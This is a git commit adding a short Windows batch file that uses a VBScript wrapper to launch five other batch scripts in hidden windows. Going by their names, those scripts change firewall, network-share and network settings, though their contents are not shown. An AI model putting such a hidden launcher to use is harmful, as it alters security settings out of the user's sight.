7cd5a31338a37aacd178215b2040dc687db09cdb
nyuiop <gapin.sla@gmail.com>
2025-05-13 13:57:12 +0300

    Add files via upload

---
+++ one.bat
@@ -0,0 +1,6 @@
+start /min wscript.exe "C:\bat\hide.vbs" "C:\bat\1.bat"
+start /min wscript.exe "C:\bat\hide.vbs" "C:\bat\hidelocalcomp.bat"
+start /min wscript.exe "C:\bat\hide.vbs" "C:\bat\netsharebat.bat"
+start /min wscript.exe "C:\bat\hide.vbs" "C:\bat\firewall.bat"
+start /min wscript.exe "C:\bat\hide.vbs" "C:\bat\set_net.bat"
+
